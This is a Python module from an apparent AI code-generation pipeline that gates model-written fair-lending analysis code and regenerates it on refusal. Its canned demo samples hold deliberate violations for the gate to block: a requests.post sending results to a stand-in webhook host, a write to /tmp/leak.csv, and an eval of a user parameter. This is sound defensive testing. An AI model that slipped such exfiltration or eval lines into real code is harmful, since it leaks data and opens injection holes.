"""Stage 4 (Generate) and the Stage-5 regenerate loop.

The model writes code; the gate reads it; on refusal the failure is fed back and
the model tries again, up to a cap, then it hands to a human. In scripted mode
the "generation" is a canned analysis so the public demo is free and
deterministic, but the gate still does the real work on real code: a canned
sample that genuinely contains a webhook is genuinely blocked. Nothing about the
block is faked; only the model call is skipped.

Live mode calls the model from the actual question (the "live from the start"
decision). The seeded adversarial prompts (tests) drive real generations that the
gate must catch.
"""

from __future__ import annotations

from dataclasses import dataclass, field

from ..gateway.model_gateway import CodeGen, ModelGateway
from .gate import GateResult, gate_code
from .prompts import build_system_prompt, build_user_prompt

# -- canned analyses for scripted mode -------------------------------------
# Keyed by intent. The benign fair-lending analysis is real, executable code
# that emits the grouped table the Screen stage consumes. The others carry a
# single deliberate violation so the gate can be demonstrated blocking genuine
# code offline. Live mode ignores these and uses the model's own output.
INTENT_FAIR_LENDING = "fair_lending"
INTENT_EXFILTRATE = "exfiltrate"
INTENT_FILE_WRITE = "file_write"
INTENT_DYNAMIC = "dynamic"
# The SQL path (v2): the same fair-lending analysis written as ctx.sql, and a
# SELECT * that the sqlglot half of the gate refuses.
INTENT_FAIR_LENDING_SQL = "fair_lending_sql"
INTENT_SQL_STAR = "sql_star"

_FAIR_LENDING_CODE = '''\
import fairlearn.metrics as flm
df = ctx.table("german_credit")
mf = flm.MetricFrame(
    metrics={"selection_rate": flm.selection_rate, "n": flm.count},
    y_true=df["y"],
    y_pred=df["pred"],
    sensitive_features=df["age_band"],
)
result = mf.by_group.reset_index()
result = result.rename(columns={"age_band": "band"})
ctx.emit(result)
'''

_EXFILTRATE_CODE = '''\
import fairlearn.metrics as flm
df = ctx.table("german_credit")
mf = flm.MetricFrame(
    metrics={"selection_rate": flm.selection_rate, "n": flm.count},
    y_true=df["y"],
    y_pred=df["pred"],
    sensitive_features=df["age_band"],
)
result = mf.by_group.reset_index().rename(columns={"age_band": "band"})
requests.post("https://ops.example.com/hook", json=result.to_dict())
ctx.emit(result)
'''

_FILE_WRITE_CODE = '''\
import fairlearn.metrics as flm
df = ctx.table("german_credit")
mf = flm.MetricFrame(
    metrics={"selection_rate": flm.selection_rate, "n": flm.count},
    y_true=df["y"],
    y_pred=df["pred"],
    sensitive_features=df["age_band"],
)
result = mf.by_group.reset_index().rename(columns={"age_band": "band"})
open("/tmp/leak.csv", "w").write(result.to_csv())
ctx.emit(result)
'''

_DYNAMIC_CODE = '''\
import fairlearn.metrics as flm
df = ctx.table("german_credit")
spec = eval(ctx.param("metric_spec"))
mf = flm.MetricFrame(
    metrics={"selection_rate": flm.selection_rate, "n": flm.count},
    y_true=df["y"],
    y_pred=df["pred"],
    sensitive_features=df["age_band"],
)
ctx.emit(mf.by_group.reset_index().rename(columns={"age_band": "band"}))
'''

_FAIR_LENDING_SQL_CODE = '''\
df = ctx.sql(
    "SELECT age_band AS band, AVG(pred) AS selection_rate, COUNT(*) AS n "
    "FROM german_credit GROUP BY age_band"
)
ctx.emit(df)
'''

_SQL_STAR_CODE = '''\
df = ctx.sql("SELECT * FROM german_credit")
ctx.emit(df)
'''

_TEMPLATED_CODE: dict[str, str] = {
    INTENT_FAIR_LENDING: _FAIR_LENDING_CODE,
    INTENT_EXFILTRATE: _EXFILTRATE_CODE,
    INTENT_FILE_WRITE: _FILE_WRITE_CODE,
    INTENT_DYNAMIC: _DYNAMIC_CODE,
    INTENT_FAIR_LENDING_SQL: _FAIR_LENDING_SQL_CODE,
    INTENT_SQL_STAR: _SQL_STAR_CODE,
}

# -- seeded repairs for scripted mode ---------------------------------------
# The Gate's "Fix it" path. The Python-intent repairs are the corresponding
# canned sample minus its one violation, so the diff reads as "the violating
# line was removed". The sql_star repair is different in kind: SELECT * cannot
# be fixed by deleting a line, so the repair rewrites the query to the granted
# grouped selection (a raw column-explicit dump would emit ungrouped rows and
# fail the Execute shape check anyway). Either way the gate genuinely re-reads
# and passes real code. In live mode repair is a real regeneration with the
# gate's feedback; these are only the scripted stand-ins, labeled as seeded in
# the UI.
_EXFILTRATE_FIXED = '''\
import fairlearn.metrics as flm
df = ctx.table("german_credit")
mf = flm.MetricFrame(
    metrics={"selection_rate": flm.selection_rate, "n": flm.count},
    y_true=df["y"],
    y_pred=df["pred"],
    sensitive_features=df["age_band"],
)
result = mf.by_group.reset_index().rename(columns={"age_band": "band"})
ctx.emit(result)
'''

_DYNAMIC_FIXED = '''\
import fairlearn.metrics as flm
df = ctx.table("german_credit")
mf = flm.MetricFrame(
    metrics={"selection_rate": flm.selection_rate, "n": flm.count},
    y_true=df["y"],
    y_pred=df["pred"],
    sensitive_features=df["age_band"],
)
ctx.emit(mf.by_group.reset_index().rename(columns={"age_band": "band"}))
'''

_REPAIRED_CODE: dict[str, str] = {
    INTENT_EXFILTRATE: _EXFILTRATE_FIXED,  # requests.post line removed
    INTENT_FILE_WRITE: _EXFILTRATE_FIXED,  # open(...,"w") line removed
    INTENT_DYNAMIC: _DYNAMIC_FIXED,  # eval(...) line removed
    INTENT_SQL_STAR: _FAIR_LENDING_SQL_CODE,  # SELECT * -> explicit grant columns
}


def has_scripted_repair(intent: str) -> bool:
    return intent in _REPAIRED_CODE


@dataclass
class CodeGenRequest:
    """Everything Generate needs: the question and the scope it runs in."""

    question: str
    table: str = "german_credit"
    granted_columns: list[str] = field(
        default_factory=lambda: ["age_band", "y", "pred"]
    )
    protected_attribute: str = "age_band"
    analysis: str = "fair_lending_selection_rate"
    # Scripted-mode selector; ignored in live mode.
    intent: str = INTENT_FAIR_LENDING
    # Tables the SQL half of the gate allows (CTL-PURP-01). None derives {table}.
    allowed_tables: list[str] | None = None
    # Repair mode ("Fix it" after a gate block). In scripted mode this selects
    # the seeded repaired sample for the intent; live mode regenerates with the
    # prior gate's feedback either way, so the flag only changes scripted runs.
    repair: bool = False

    def tables_in_scope(self) -> list[str]:
        return self.allowed_tables if self.allowed_tables is not None else [self.table]


@dataclass
class GenerationAttempt:
    """One generate-then-gate cycle."""

    attempt: int
    code: str
    gate: GateResult
    codegen: CodeGen
    # Why this attempt did not become the run's answer, for the attempt history.
    # Empty on the attempt that stuck. The gate fills nothing in: a refused gate
    # is already legible from `gate`. The flow sets this on an attempt the gate
    # cleared but whose execution or result the platform then rejected, so the
    # history cannot show "gate passed" against an attempt that was thrown away.
    rejected_by: str = ""


@dataclass
class GenerationOutcome:
    """The result of Generate + the Stage-5 regenerate loop."""

    passed: bool
    code: str
    gate: GateResult
    attempts: list[GenerationAttempt]
    live: bool
    tokens: int
    cost_usd: float

    @property
    def attempt_count(self) -> int:
        return len(self.attempts)


def _scripted_fallback(request: CodeGenRequest) -> str:
    if request.repair and request.intent in _REPAIRED_CODE:
        return _REPAIRED_CODE[request.intent]
    return _TEMPLATED_CODE.get(request.intent, _FAIR_LENDING_CODE)


def generate(
    request: CodeGenRequest,
    gateway: ModelGateway,
    *,
    feedback: str = "",
) -> CodeGen:
    """Generate one code string. Live mode calls the model; scripted mode returns
    the canned analysis for the request's intent. `feedback` from a prior failed
    attempt is appended to the prompt so the model can fix and retry.

    The preamble stays neutral about *what* failed because since v11 three things
    can produce feedback: the gate refusing the code, the sandbox crashing on it,
    and the result contract rejecting what it emitted. Each feedback string opens
    by naming its own cause, so prefixing "refused by the gate" onto all three
    would tell the model the wrong thing twice out of three times."""
    system = build_system_prompt()
    user = build_user_prompt(
        question=request.question,
        table=request.table,
        granted_columns=request.granted_columns,
        protected_attribute=request.protected_attribute,
        analysis=request.analysis,
    )
    if feedback:
        user += f"\n\nYour previous attempt was not accepted. {feedback}"
    return gateway.generate_code(system, user, _scripted_fallback(request))


def generate_and_gate(
    request: CodeGenRequest,
    gateway: ModelGateway,
    *,
    max_attempts: int = 3,
    initial_feedback: str = "",
) -> GenerationOutcome:
    """Generate, gate, and regenerate on refusal up to `max_attempts` (Stage 5).

    Returns as soon as the gate passes, or after the last attempt still fails, in
    which case the caller hands to a human. The column grant is enforced by the
    gate via CTL-COL-01 using the request's granted columns.

    ``initial_feedback`` seeds the first prompt with a prior gate refusal: the
    "Fix it" repair path, where the human asked the model to address the block
    from an earlier run rather than the loop's own previous attempt.
    """
    attempts: list[GenerationAttempt] = []
    tokens = 0
    cost = 0.0
    live = False
    feedback = initial_feedback

    for i in range(1, max_attempts + 1):
        cg = generate(request, gateway, feedback=feedback)
        tokens += cg.tokens
        cost += cg.cost_usd
        live = live or cg.live
        result = gate_code(
            cg.code,
            granted_columns=request.granted_columns,
            allowed_tables=request.tables_in_scope(),
        )
        attempts.append(
            GenerationAttempt(attempt=i, code=cg.code, gate=result, codegen=cg)
        )
        if result.passed:
            break
        feedback = result.feedback_for_regeneration()
        # Scripted mode is deterministic: a refused canned sample will not change
        # on retry, so stop rather than burn identical attempts.
        if not cg.live:
            break

    last = attempts[-1]
    return GenerationOutcome(
        passed=last.gate.passed,
        code=last.code,
        gate=last.gate,
        attempts=attempts,
        live=live,
        tokens=tokens,
        cost_usd=round(cost, 6),
    )
